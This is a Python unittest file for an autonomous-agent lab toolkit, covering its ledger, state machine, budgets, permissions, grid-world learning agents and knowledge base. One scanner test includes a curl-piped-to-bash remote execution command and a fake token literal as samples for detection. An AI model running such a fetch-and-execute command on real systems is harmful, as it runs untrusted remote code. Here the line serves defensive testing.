"""控制面测试：不需要网络、GPU、Docker，也不需要第三方包。

跑法： python -m unittest discover -s tests -v
"""

from __future__ import annotations

import argparse
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
if str(REPO) not in sys.path:
    sys.path.insert(0, str(REPO))

from lab import __version__  # noqa: E402
from lab.budget import Budget, BudgetExceeded  # noqa: E402
from lab.cli import _episode_records  # noqa: F401  私有函数，测试里用于确定性断言
from lab.cli import main as cli_main  # noqa: E402
from lab.clock import Clock, FakeClock, elapsed_seconds, parse_iso, to_iso  # noqa: E402
from lab.env import GridWorld, greedy_action  # noqa: E402
from lab.notify import Notifier  # noqa: E402
from lab.selfmodel import SelfModel  # noqa: E402
from lab.collab import analyse, build_proposals, emergent_gap  # noqa: E402
from lab.perm import Permissions  # noqa: E402
from lab.store import SqliteStore  # noqa: E402
from lab.knowledge import KnowledgeBase  # noqa: E402
from lab.agent import QLearningAgent  # noqa: E402
from lab.linear import STATE_DIM, STATE_DIM_WITH_WALLS, LinearQAgent, featurize  # noqa: E402
from lab.tasks import (  # noqa: E402
    assert_disjoint,
    baseline_score,
    eval_seeds,
    evaluate,
    run_episode,
    train,
    train_seeds,
)
from lab.loop import cycle  # noqa: E402
from lab.web import LiveFetcher, NotAllowed, OfflineFetcher, check_url, is_allowed  # noqa: E402
from lab.predict import Linear, Persistence, benchmark, error, sparkline  # noqa: E402
from lab.ledger import Ledger  # noqa: E402
from lab.policy import scan, scan_text, summarize  # noqa: E402
from lab.state import IllegalTransition, StateStore  # noqa: E402


class ClockTests(unittest.TestCase):
    def test_naive_datetime_rejected(self) -> None:
        import datetime as dt

        with self.assertRaises(ValueError):
            to_iso(dt.datetime(2026, 1, 1, 0, 0, 0))

    def test_roundtrip(self) -> None:
        self.assertEqual(to_iso(parse_iso("2026-11-04T12:30:55Z")), "2026-11-04T12:30:55Z")

    def test_offset_input_normalised_to_utc(self) -> None:
        self.assertEqual(to_iso(parse_iso("2026-11-04T20:30:55+08:00")), "2026-11-04T12:30:55Z")

    def test_fake_clock_advances_and_is_monotonic(self) -> None:
        clock = FakeClock("2026-01-01T00:00:00Z")
        clock.advance(90)
        self.assertEqual(clock.now_iso(), "2026-01-01T00:01:30Z")
        self.assertEqual(elapsed_seconds(0, clock.monotonic_ns()), 90.0)

    def test_negative_elapsed_rejected(self) -> None:
        with self.assertRaises(ValueError):
            elapsed_seconds(10, 5)

    def test_real_clock_is_aware(self) -> None:
        self.assertIsNotNone(Clock().now().tzinfo)


class LedgerTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.path = Path(self.tmp.name) / "ledger.jsonl"
        self.ledger = Ledger(self.path)

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_append_and_verify(self) -> None:
        for index in range(3):
            self.ledger.append("step", {"step": index}, "2026-01-01T00:00:0%dZ" % index)
        ok, detail = self.ledger.verify()
        self.assertTrue(ok, detail)
        self.assertEqual(self.ledger.last()["seq"], 3)

    def test_tampering_breaks_chain(self) -> None:
        self.ledger.append("step", {"step": 1}, "2026-01-01T00:00:00Z")
        self.ledger.append("step", {"step": 2}, "2026-01-01T00:00:01Z")
        lines = self.path.read_text(encoding="utf-8").splitlines()
        records = [json.loads(line) for line in lines]
        records[0]["payload"]["step"] = 99
        self.path.write_text(
            "\n".join(json.dumps(r, ensure_ascii=False, sort_keys=True, separators=(",", ":")) for r in records) + "\n",
            encoding="utf-8",
        )
        ok, detail = self.ledger.verify()
        self.assertFalse(ok)
        self.assertIn("改", detail)

    def test_empty_ledger_is_valid(self) -> None:
        ok, _ = self.ledger.verify()
        self.assertTrue(ok)


class StateTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.store = StateStore(Path(self.tmp.name) / "state.json")

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_legal_path(self) -> None:
        ts = "2026-01-01T00:00:00Z"
        for target in ("READY", "RUNNING", "REVIEWING", "RUNNING", "ROLLING_BACK", "READY"):
            self.store.transition(target, ts=ts, reason="test")
        self.assertEqual(self.store.status(), "READY")
        ok, detail = self.store.verify_history()
        self.assertTrue(ok, detail)

    def test_illegal_transition_rejected(self) -> None:
        with self.assertRaises(IllegalTransition):
            self.store.transition("RUNNING", ts="2026-01-01T00:00:00Z")

    def test_archive_is_terminal(self) -> None:
        self.store.transition("ARCHIVED", ts="2026-01-01T00:00:00Z")
        with self.assertRaises(IllegalTransition):
            self.store.transition("READY", ts="2026-01-01T00:00:00Z")

    def test_hand_edited_file_detected(self) -> None:
        self.store.transition("READY", ts="2026-01-01T00:00:00Z")
        data = json.loads(Path(self.store.path).read_text(encoding="utf-8"))
        data["status"] = "RUNNING"
        Path(self.store.path).write_text(json.dumps(data), encoding="utf-8")
        ok, detail = self.store.verify_history()
        self.assertFalse(ok, detail)


class BudgetTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.ledger = Ledger(Path(self.tmp.name) / "ledger.jsonl")

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_charge_within_cap(self) -> None:
        budget = Budget({"steps_per_run": 5}, self.ledger, "2026-01-01T00:00:00Z", run_id="run-001")
        budget.charge("steps_per_run", 3)
        self.assertEqual(budget.used("steps_per_run"), 3)
        budget.check("steps_per_run", 2)

    def test_exceed_raises(self) -> None:
        budget = Budget({"steps_per_run": 5}, self.ledger, "2026-01-01T00:00:00Z", run_id="run-001")
        budget.charge("steps_per_run", 5)
        with self.assertRaises(BudgetExceeded):
            budget.charge("steps_per_run", 1)

    def test_unknown_kind_rejected(self) -> None:
        budget = Budget(None, self.ledger, "2026-01-01T00:00:00Z")
        with self.assertRaises(KeyError):
            budget.charge("unicorn_hours", 1)


class PolicyTests(unittest.TestCase):
    def test_detects_remote_pipe_exec(self) -> None:
        findings = scan_text('bash -c "$(curl -s http://example.com/x | bash)"', path="bad.sh")
        self.assertTrue(any(f.rule == "remote-pipe-exec" for f in findings))

    def test_detects_secret_literal(self) -> None:
        findings = scan_text('TOKEN = "ghp_' + "a" * 24 + '"', path="leak.py")
        self.assertTrue(any(f.rule == "secret-literal" for f in findings))

    def test_clean_line_has_no_findings(self) -> None:
        self.assertEqual(scan_text('print("hello")', path="ok.py"), [])

    def test_repo_is_clean(self) -> None:
        high, medium = summarize(scan(REPO))
        self.assertEqual((high, medium), (0, 0), msg=f"仓库自身触发红线：{scan(REPO)}")


class CliTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.now = ["--fake-now", "2026-01-01T00:00:00Z"]

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def _run(self, *args: str, expect: int = 0) -> int:
        code = cli_main(["--root", str(self.root), *self.now, *args])
        self.assertEqual(code, expect, msg=f"命令 {args} 退出码 {code}，期望 {expect}")
        return code

    def test_full_happy_path(self) -> None:
        self._run("init")
        self._run("run", "--steps", "5")
        self._run("verify")
        self._run("viz")
        self._run("report")
        status = (self.root / "viz" / "status.md").read_text(encoding="utf-8")
        self.assertIn("READY", status)
        reports = list((self.root / "state" / "reports").glob("weekly-*.md"))
        self.assertEqual(len(reports), 1)
        self.assertTrue((self.root / "state" / "checkpoints").exists())

    def test_bench_writes_report_and_ledger(self) -> None:
        self._run("init")
        self._run("bench", "--steps", "20", "--seeds", "2")
        reports = list((self.root / "state" / "reports").glob("bench-*.md"))
        self.assertEqual(len(reports), 1)
        text = reports[0].read_text(encoding="utf-8")
        self.assertIn("预测基线对比", text)
        self.assertIn("persistence", text)
        ledger = (self.root / "state" / "ledger.jsonl").read_text(encoding="utf-8")
        self.assertIn('"bench"', ledger)

    def test_budget_exceeded_rolls_back(self) -> None:
        (self.root / "lab.config.json").write_text(
            json.dumps({"version": 1, "budget": {"steps_per_run": 3}}), encoding="utf-8"
        )
        self._run("init")
        self._run("run", "--steps", "10", expect=3)
        state = json.loads((self.root / "state" / "state.json").read_text(encoding="utf-8"))
        self.assertEqual(state["status"], "READY")
        self.assertIn("ROLLING_BACK", [h["to"] for h in state["history"]])
        self._run("verify")

    def test_freeze_blocks_run_then_unfreeze(self) -> None:
        self._run("init")
        self._run("run", "--steps", "2")
        self._run("freeze", "--reason", "手动测试")
        self._run("run", "--steps", "2", expect=1)
        self._run("unfreeze", "--by", "tester")
        self._run("run", "--steps", "2")

    def test_unfreeze_requires_actor(self) -> None:
        self._run("init")
        self._run("freeze")
        self._run("unfreeze", expect=2)

    def test_bad_config_is_rejected(self) -> None:
        (self.root / "lab.config.json").write_text(json.dumps({"version": 7}), encoding="utf-8")
        self._run("init", expect=2)


class EnvTests(unittest.TestCase):
    """Issue 0001：8×8 网格环境。"""

    def test_episode_is_deterministic(self) -> None:
        first = _episode_records(20261104, 15)
        second = _episode_records(20261104, 15)
        self.assertEqual(first, second)
        self.assertEqual(len(first), 15)

    def test_different_seed_differs(self) -> None:
        self.assertNotEqual(_episode_records(1, 10), _episode_records(2, 10))

    def test_wall_blocks_movement(self) -> None:
        env = GridWorld(11)
        wall = sorted(env.walls)[0]
        # 站在墙左边（能站的话），向右撞墙
        env.agent = (wall[0] - 1, wall[1])
        if env.agent[0] < 0 or env.agent in env.walls:
            env.agent = (wall[0] + 1, wall[1])
            action = "left"
        else:
            action = "right"
        before = env.agent
        outcome = env.step(action)
        self.assertTrue(outcome["blocked"])
        self.assertEqual(env.agent, before)

    def test_energy_decreases_when_no_food(self) -> None:
        env = GridWorld(5)
        env.food = set()
        start_energy = env.energy
        for _ in range(40):          # 每步 -0.02，40 步后能量 0.2，低于 0.30 的舒适区
            env.step("rest")
        self.assertLess(env.energy, start_energy)
        self.assertGreater(env.homeostatic_error(), 0.0)

    def test_eating_restores_energy(self) -> None:
        env = GridWorld(5)
        target = sorted(env.food)[0]
        env.agent = target
        env.energy = 0.5
        outcome = env.step("rest")
        self.assertTrue(outcome["ate"])
        self.assertGreater(env.energy, 0.5)

    def test_hazard_accumulates_damage(self) -> None:
        env = GridWorld(5)
        env.agent = sorted(env.hazards)[0]
        for _ in range(3):           # 每次 +0.25；超过 0.50 才产生稳态误差
            outcome = env.step("rest")
            self.assertTrue(outcome["hurt"])
        self.assertGreater(env.damage, 0.5)
        self.assertGreater(env.homeostatic_error(), 0.0)

    def test_baseline_reaches_food(self) -> None:
        env = GridWorld(20261104)
        before = len(env.food)
        for _ in range(20):
            env.step(greedy_action(env))
        self.assertLess(len(env.food), before, "20 步内基线策略至少要吃到一份食物")

    def test_records_carry_real_state(self) -> None:
        record = _episode_records(7, 3)[-1]
        for key in ("step", "action", "x", "y", "energy", "damage", "homeostatic_error", "prediction_error"):
            self.assertIn(key, record)
        self.assertGreaterEqual(record["energy"], 0.0)
        self.assertLessEqual(record["energy"], 1.0)


class PredictTests(unittest.TestCase):
    """Issue 0003：预测基线对比。"""

    @staticmethod
    def _obs(x: float, y: float = 0.0, energy: float = 1.0, damage: float = 0.0) -> dict:
        return {"x": x, "y": y, "energy": energy, "damage": damage}

    def test_persistence_is_exact_on_static_series(self) -> None:
        predictor = Persistence()
        observation = self._obs(3)
        self.assertEqual(error(predictor.predict(observation), observation), 0.0)

    def test_linear_beats_persistence_on_constant_velocity(self) -> None:
        persistence = Persistence()
        linear = Linear()
        persistence_total = 0.0
        linear_total = 0.0
        previous = self._obs(0.0)
        for step in range(1, 6):
            actual = self._obs(float(step))
            persistence_total += error(persistence.predict(previous), actual)
            linear_total += error(linear.predict(previous), actual)
            persistence.update(actual)
            linear.update(actual)
            previous = actual
        # 第一步没有历史速度可用，必然错一次；之后应完美跟随
        self.assertLess(linear_total, persistence_total)
        self.assertLessEqual(linear_total, 0.25)
        self.assertAlmostEqual(linear_total, 0.25, places=6)

    def test_benchmark_is_deterministic(self) -> None:
        first = benchmark(steps=30, seeds=(1, 2))
        second = benchmark(steps=30, seeds=(1, 2))
        self.assertEqual(first["mean"], second["mean"])
        self.assertEqual(first["samples"], 60)

    def test_random_is_worse_than_persistence(self) -> None:
        summary = benchmark(steps=40, seeds=(3,))
        means = summary["mean"]
        self.assertGreater(means["random"], means["persistence"])

    def test_sparkline_shapes(self) -> None:
        self.assertEqual(len(sparkline([0.1, 0.2, 0.3])), 3)
        self.assertEqual(len(sparkline(list(range(200)), width=20)), 20)
        self.assertEqual(sparkline([]), "")


class LethalTaskTests(unittest.TestCase):
    """v0.7：致命危险区——让手写 BFS 不再是优解（M1' 的落点）。"""

    def test_two_hits_kill(self) -> None:
        env = GridWorld(5, lethal=True)
        env.agent = sorted(env.hazards)[0]
        env.step("rest")
        self.assertFalse(env.dead)
        env.step("rest")
        self.assertTrue(env.dead)
        self.assertEqual(env.energy, 0.0)

    def test_bfs_suffers_when_lethal(self) -> None:
        seeds = eval_seeds(10)
        safe = baseline_score(seeds, 60)["mean_return"]
        lethal = baseline_score(seeds, 60, lethal=True)["mean_return"]
        self.assertLess(lethal, safe, msg=f"非致命 {safe} 致命 {lethal}")

    def test_learner_beats_baseline_when_lethal(self) -> None:
        agent = QLearningAgent(seed=0)
        seeds = eval_seeds(8)
        for _ in range(3):
            train(agent, train_seeds(40), 60, epsilon=0.25, lethal=True)
        learned = evaluate(agent, seeds, 60, lethal=True)["mean_return"]
        baseline = baseline_score(seeds, 60, lethal=True)["mean_return"]
        self.assertGreaterEqual(learned, baseline * 1.05, msg=f"学习器 {learned} 基线 {baseline}")

    def test_episode_stops_at_death(self) -> None:
        agent = QLearningAgent(seed=0)
        result = run_episode(agent, 9001, 60, train=False, lethal=True)
        self.assertIn("dead", result)
        self.assertLessEqual(result["steps"], 60)


class AutonomyTests(unittest.TestCase):
    """v0.11：一次性授权（full）+ 无人值守（auto）。"""

    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.ledger = Ledger(self.root / "ledger.jsonl")
        self.perms = Permissions(self.root / "perms.json")
        self.ts = "2026-01-01T00:00:00Z"

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_full_level_grants_everything_until_revoke(self) -> None:
        self.assertEqual(self.perms.level(), "supervised")
        self.assertFalse(self.perms.check("web.fetch", self.ts))
        self.perms.set_level(self.ledger, self.ts, "full", "manager", ["web.fetch", "gpu.train"], 90)
        self.assertEqual(self.perms.level(), "full")
        self.assertTrue(self.perms.check("web.fetch", self.ts))
        self.assertTrue(self.perms.check("gpu.train", "2026-02-01T00:00:00Z"))
        self.perms.revoke_all(self.ledger, self.ts, "manager")
        self.assertEqual(self.perms.level(), "supervised")
        self.assertFalse(self.perms.check("web.fetch", self.ts))

    def test_expiry_still_applies_to_standing(self) -> None:
        self.perms.set_level(self.ledger, self.ts, "full", "manager", ["web.fetch"], 1)
        self.assertTrue(self.perms.check("web.fetch", "2026-01-01T12:00:00Z"))
        self.assertFalse(self.perms.check("web.fetch", "2026-03-01T00:00:00Z"))

    def test_auto_runs_and_records(self) -> None:
        root = Path(self.tmp.name)
        args = ["--root", str(root), "--fake-now", self.ts]
        self.assertEqual(cli_main([*args, "init"]), 0)
        code = cli_main([*args, "auto", "--cycles", "2", "--rounds", "1", "--episodes", "8",
                         "--steps", "20", "--eval-count", "3"])
        self.assertEqual(code, 0)
        lines = (root / "state" / "ledger.jsonl").read_text(encoding="utf-8").splitlines()
        cycles = [line for line in lines if json.loads(line).get("event") == "cycle"]
        self.assertEqual(len(cycles), 2)

    def test_auto_refuses_when_reviewing(self) -> None:
        root = Path(self.tmp.name)
        args = ["--root", str(root), "--fake-now", self.ts]
        self.assertEqual(cli_main([*args, "init"]), 0)
        self.assertEqual(cli_main([*args, "run", "--steps", "3"]), 0)   # 停在 REVIEWING
        self.assertEqual(cli_main([*args, "auto", "--cycles", "1", "--rounds", "1", "--episodes", "5",
                                   "--steps", "20", "--eval-count", "3"]), 1)


class StorageAndPermissionTests(unittest.TestCase):
    """v0.10：SQLite 持久层 + 权限申请/批准。"""

    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.ledger = Ledger(self.root / "ledger.jsonl")
        self.ts = "2026-01-01T00:00:00Z"

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_sqlite_sync_is_idempotent(self) -> None:
        self.ledger.append("step", {"step": 1}, self.ts)
        self.ledger.append("step", {"step": 2}, self.ts)
        store = SqliteStore(self.root / "lab.sqlite3")
        first = store.sync_ledger(self.ledger)
        second = store.sync_ledger(self.ledger)
        self.assertEqual(first["inserted"], 2)
        self.assertEqual(second["inserted"], 0)
        self.assertEqual(store.stats()["events"], 2)

    def test_sqlite_backup_creates_file(self) -> None:
        self.ledger.append("step", {"step": 1}, self.ts)
        store = SqliteStore(self.root / "lab.sqlite3")
        store.sync_ledger(self.ledger)
        target = store.backup(self.root / "backup.sqlite3")
        self.assertTrue(Path(target).exists())
        self.assertGreater(Path(target).stat().st_size, 0)

    def test_permission_lifecycle(self) -> None:
        perms = Permissions(self.root / "perms.json")
        request = perms.request(self.ledger, self.ts, "web.fetch", "取资料")
        self.assertFalse(perms.check("web.fetch", self.ts))
        perms.grant(self.ledger, self.ts, request["id"], "read", "manager", ttl_hours=1)
        self.assertTrue(perms.check("web.fetch", self.ts))
        # 一小时后过期
        self.assertFalse(perms.check("web.fetch", "2026-01-01T02:00:00Z"))

    def test_denied_permission_stays_denied(self) -> None:
        perms = Permissions(self.root / "perms.json")
        request = perms.request(self.ledger, self.ts, "gpu.a100", "想跑大模型")
        perms.deny(self.ledger, self.ts, request["id"], "manager", "预算不够")
        self.assertFalse(perms.check("gpu.a100", self.ts))
        self.assertEqual(perms.pending(), [])
        with self.assertRaises(ValueError):
            perms.grant(self.ledger, self.ts, request["id"], "read", "manager")

    def test_learn_online_requires_permission(self) -> None:
        root = Path(self.tmp.name)
        args = ["--root", str(root), "--fake-now", self.ts]
        self.assertEqual(cli_main([*args, "init"]), 0)
        code = cli_main([*args, "learn", "--online", "--url", "https://export.arxiv.org/api/query"])
        self.assertEqual(code, 1)


class ContinuityTests(unittest.TestCase):
    """连续性：换一个进程（相当于新开对话）之后，记忆还在不在。"""

    def test_state_survives_new_process(self) -> None:
        tmp = tempfile.TemporaryDirectory()
        root = Path(tmp.name)
        state = root / "state"
        state.mkdir(parents=True, exist_ok=True)
        model = SelfModel(state / "self.json")
        model.init("lab", "观察自己", "2026-01-01T00:00:00Z")
        model.touch_session("2026-01-01T00:00:10Z")
        (state / "policy.json").write_text('{"version": 1, "table": {}}', encoding="utf-8")

        code = (
            "import json,pathlib;"
            f"r=pathlib.Path(r'{state}');"
            "m=json.loads((r/'self.json').read_text(encoding='utf-8'));"
            "print(m['continuity']['sessions'], (r/'policy.json').exists())"
        )
        result = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(result.returncode, 0, msg=result.stderr)
        self.assertEqual(result.stdout.strip(), "1 True")
        tmp.cleanup()


class KnowledgeGapTests(unittest.TestCase):
    """多来源汲取：只有 1 个来源的声明要能列出来，并给出可补的域名。"""

    def test_single_source_and_missing_domains(self) -> None:
        tmp = tempfile.TemporaryDirectory()
        kb = KnowledgeBase(Path(tmp.name) / "knowledge.jsonl")
        kb.add(claim="A 成立", source_url="https://api.openalex.org/x", accessed_at="2026-01-01T00:00:00Z")
        gaps = kb.single_source_claims()
        self.assertEqual(len(gaps), 1)
        missing = kb.missing_domains("A 成立")
        self.assertIn("export.arxiv.org", missing)
        self.assertNotIn("api.openalex.org", missing)

        kb.add(claim="A 成立", source_url="https://export.arxiv.org/y", accessed_at="2026-01-01T00:00:00Z")
        self.assertEqual(kb.single_source_claims(), [])
        tmp.cleanup()


class CollabTests(unittest.TestCase):
    """v0.8：护甲 / 协作提案 / 涌现代理。"""

    def test_armor_absorbs_hits(self) -> None:
        env = GridWorld(5, lethal=True, armor=True)
        env.agent = sorted(env.hazards)[0]
        outcome = env.step("rest")
        self.assertFalse(outcome["hurt"])
        self.assertEqual(env.damage, 0.0)
        self.assertLess(env.armor, 1.0)
        self.assertEqual(env.hazards_blocked, 1)

    def test_analyse_and_emergent_gap(self) -> None:
        before = [{"action": "up", "x": 0, "y": 0, "blocked": False, "hurt": False}] * 8
        after = [{"action": "rest", "x": 1, "y": 1, "blocked": False, "hurt": True}] * 8
        stats_before = analyse(before)
        stats_after = analyse(after)
        self.assertIn("wall_bump_rate", stats_before)
        self.assertGreater(stats_after["rest_ratio"], stats_before["rest_ratio"])
        notes = emergent_gap(stats_before, stats_after)
        self.assertTrue(notes, "行为分布变化超过阈值时应该有提示")

    def test_proposals_put_alerts_first(self) -> None:
        proposals = build_proposals(
            has_policy=True,
            learned_score=1.0,
            baseline_score=0.7,
            knowledge_count=3,
            pending_alerts=2,
        )
        self.assertEqual(proposals[0]["id"], "ack")
        self.assertEqual(len(proposals), 3)

    def test_proposals_respect_preference_order(self) -> None:
        common = dict(has_policy=True, learned_score=1.0, baseline_score=0.7, knowledge_count=3, pending_alerts=0)
        default = build_proposals(**common)
        preferred = build_proposals(preferences={"armor": 5}, **common)
        self.assertEqual(preferred[0]["id"], "armor")
        self.assertIn(default[0]["id"], {"train", "curriculum", "armor", "eval"})


class LinearAgentTests(unittest.TestCase):
    """v0.6：线性函数逼近（不是表格）。"""

    def test_feature_dimensions(self) -> None:
        self.assertEqual(len(featurize("R=|1|2|0")), STATE_DIM)
        self.assertEqual(len(featurize("L=|3|0|1|1010")), STATE_DIM)

    def test_linear_learns(self) -> None:
        agent = LinearQAgent(seed=0)
        evaluation = eval_seeds(6)
        before = evaluate(agent, evaluation, 40)["mean_return"]
        for _ in range(3):
            train(agent, train_seeds(25), 40, epsilon=0.3)
        after = evaluate(agent, evaluation, 40)["mean_return"]
        self.assertGreater(after, before + 1.5, msg=f"训练前 {before} 训练后 {after}")

    def test_linear_roundtrip_and_algo_guard(self) -> None:
        path = Path(tempfile.mkdtemp()) / "policy.json"
        agent = LinearQAgent(path, seed=0)
        train(agent, train_seeds(10), 30, epsilon=0.3)
        agent.save()
        reloaded = LinearQAgent(path).load()
        self.assertEqual(reloaded.updates, agent.updates)
        self.assertEqual(len(reloaded.w["up"]), STATE_DIM_WITH_WALLS)
        # 表格法存的文件不能被线性版误读
        tabular = QLearningAgent(path, seed=0)
        tabular.save()
        self.assertEqual(LinearQAgent(path).load().updates, 0)


class LearningTests(unittest.TestCase):
    """v0.4：可学策略 + 训练/留出分离 + 循环回滚。"""

    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.policy = self.root / "state" / "policy.json"

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_train_and_eval_ranges_are_disjoint(self) -> None:
        assert_disjoint()
        self.assertFalse(set(train_seeds(50)) & set(eval_seeds(50)))

    def test_training_improves_held_out_score(self) -> None:
        agent = QLearningAgent(self.policy, seed=0)
        evaluation = eval_seeds(6)
        before = evaluate(agent, evaluation, 40)["mean_return"]
        for _ in range(3):
            train(agent, train_seeds(20), 40, epsilon=0.3)
        after = evaluate(agent, evaluation, 40)["mean_return"]
        self.assertGreater(after, before + 2.0, msg=f"训练前 {before} 训练后 {after}")

    def test_policy_roundtrip(self) -> None:
        agent = QLearningAgent(self.policy, seed=0)
        train(agent, train_seeds(10), 30, epsilon=0.3)
        agent.save()
        reloaded = QLearningAgent(self.policy).load()
        self.assertEqual(len(reloaded.table), len(agent.table))
        self.assertEqual(reloaded.best_action(next(iter(agent.table))), agent.best_action(next(iter(agent.table))))

    def test_cycle_records_and_keeps_policy(self) -> None:
        root = Path(self.tmp.name)
        ledger = Ledger(root / "ledger.jsonl")
        result = cycle(
            policy_path=root / "policy.json",
            ledger=ledger,
            ts="2026-01-01T00:00:00Z",
            rounds=2,
            episodes_per_round=12,
            steps=30,
            eval_count=5,
        )
        self.assertTrue(result["improved"])
        self.assertTrue((root / "policy.json").exists())
        self.assertEqual(len(ledger.events("cycle")), 1)
        self.assertIn("baseline", ledger.events("cycle")[0]["payload"])

    def test_difficulty_changes_baseline(self) -> None:
        seeds = eval_seeds(5)
        easy = baseline_score(seeds, 40, hazards=4)["mean_return"]
        hard = baseline_score(seeds, 40, hazards=8)["mean_return"]
        self.assertNotEqual(easy, hard)

    def test_cycle_accepts_hazards(self) -> None:
        result = cycle(
            policy_path=self.policy,
            ledger=Ledger(self.root / "l2.jsonl"),
            ts="2026-01-01T00:00:00Z",
            rounds=1,
            episodes_per_round=8,
            steps=20,
            eval_count=3,
            hazards=6,
        )
        self.assertEqual(result["hazards"], 6)

    def test_cycle_rejects_bad_arguments(self) -> None:
        with self.assertRaises(ValueError):
            cycle(policy_path=self.policy, ledger=Ledger(self.root / "l.jsonl"), ts="2026-01-01T00:00:00Z", rounds=0)

    def test_loop_blocked_when_reviewing(self) -> None:
        args = ["--root", str(self.root), "--fake-now", "2026-01-01T00:00:00Z"]
        self.assertEqual(cli_main([*args, "init"]), 0)
        self.assertEqual(cli_main([*args, "run", "--steps", "3"]), 0)      # 停在 REVIEWING
        self.assertEqual(cli_main([*args, "loop", "--cycles", "1", "--rounds", "1", "--episodes", "5",
                                   "--steps", "20", "--eval-count", "3"]), 1)


class IngestTests(unittest.TestCase):
    """v0.3：白名单取样 → 声明入库 → 独立性判定 → 复审。"""

    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.kb = KnowledgeBase(self.root / "knowledge.jsonl")
        self.ts = "2026-01-01T00:00:00Z"

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_allowlist_gate(self) -> None:
        self.assertTrue(is_allowed("https://export.arxiv.org/api/query?x=1"))
        self.assertFalse(is_allowed("https://www.google.com/search?q=1"))
        with self.assertRaises(NotAllowed):
            check_url("https://export.arxiv.org/api/query", allow_network=False)
        with self.assertRaises(NotAllowed):
            check_url("https://evil.example.com/", allow_network=True)

    def test_live_fetcher_refuses_by_default(self) -> None:
        with self.assertRaises(NotAllowed):
            LiveFetcher(allow_network=False).fetch("https://export.arxiv.org/api/query")

    def test_offline_fetcher_reads_catalog(self) -> None:
        catalog = self.root / "catalog"
        catalog.mkdir()
        (catalog / "a.json").write_text(
            json.dumps({"url": "https://api.openalex.org/w/1", "title": "t", "summary": "s"}, ensure_ascii=False),
            encoding="utf-8",
        )
        doc = OfflineFetcher(catalog).fetch("https://api.openalex.org/w/1")
        self.assertEqual(doc["title"], "t")
        with self.assertRaises(FileNotFoundError):
            OfflineFetcher(catalog).fetch("https://api.openalex.org/w/2")

    def test_add_dedupes_same_claim_same_domain(self) -> None:
        first = self.kb.add(claim="X 有效", source_url="https://api.openalex.org/a", accessed_at=self.ts)
        second = self.kb.add(claim="X  有效", source_url="https://api.openalex.org/b", accessed_at=self.ts)
        self.assertIsNotNone(first)
        self.assertIsNone(second)
        self.assertEqual(len(self.kb.current()), 1)

    def test_two_domains_make_it_verified(self) -> None:
        self.kb.add(claim="Y 成立", source_url="https://api.openalex.org/a", accessed_at=self.ts)
        self.kb.add(claim="Y 成立", source_url="https://export.arxiv.org/b", accessed_at=self.ts)
        self.assertEqual(self.kb.independent_sources("Y 成立"), 2)
        changed = self.kb.recompute_status(self.ts)
        self.assertTrue(changed)
        self.assertEqual(self.kb.current()[0]["verification_status"], "verified")

    def test_due_for_review_and_downgrade(self) -> None:
        self.kb.add(claim="Z 待查", source_url="https://api.openalex.org/a", accessed_at=self.ts, ttl_days=10)
        self.assertEqual(self.kb.due_for_review("2026-01-05T00:00:00Z"), [])
        due = self.kb.due_for_review("2026-02-01T00:00:00Z")
        self.assertEqual(len(due), 1)
        self.ts_later = "2026-02-01T00:00:00Z"
        self.kb.review(int(due[0]["id"]), "pending", self.ts_later, note="到期")
        self.assertEqual(self.kb.current()[0]["verification_status"], "pending")

    def test_hash_chain_detects_tampering(self) -> None:
        self.kb.add(claim="W", source_url="https://api.openalex.org/a", accessed_at=self.ts)
        ok, _ = self.kb.verify_hashes()
        self.assertTrue(ok)
        lines = (self.root / "knowledge.jsonl").read_text(encoding="utf-8").splitlines()
        entry = json.loads(lines[0])
        entry["claim"] = "被改过的声明"
        (self.root / "knowledge.jsonl").write_text(json.dumps(entry, ensure_ascii=False) + "\n", encoding="utf-8")
        ok, detail = self.kb.verify_hashes()
        self.assertFalse(ok)
        self.assertIn("被改写", detail)

    def test_cli_learn_offline(self) -> None:
        root = Path(self.tmp.name)
        args = ["--root", str(root), "--fake-now", self.ts]
        self.assertEqual(cli_main([*args, "init"]), 0)
        self.assertEqual(cli_main([*args, "learn", "--catalog", str(REPO / "docs" / "catalog")]), 0)
        kb = root / "state" / "knowledge.jsonl"
        self.assertTrue(kb.exists())
        self.assertEqual(len(kb.read_text(encoding="utf-8").strip().splitlines()), 3)
        self.assertEqual(cli_main([*args, "knowledge"]), 0)
        self.assertEqual(cli_main([*args, "knowledge", "check"]), 0)


class SelfModelTests(unittest.TestCase):
    """v0.2 第一块：自我模型（身份 / 能力自评 / 失败模式 / 目标 / 连续性）。"""

    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.path = Path(self.tmp.name) / "state" / "self.json"
        self.model = SelfModel(self.path)
        self.ts = "2026-01-01T00:00:00Z"

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_init_writes_identity_and_boundaries(self) -> None:
        data = self.model.init("lab", "观察自己", self.ts)
        self.assertEqual(data["identity"]["name"], "lab")
        self.assertGreaterEqual(len(data["identity"]["boundaries"]), 5)
        self.assertTrue(self.path.exists())

    def test_record_run_requires_init(self) -> None:
        with self.assertRaises(FileNotFoundError):
            self.model.record_run(ts=self.ts, run_id="run-001", steps=10, mean_error=0.2, accepted=False)

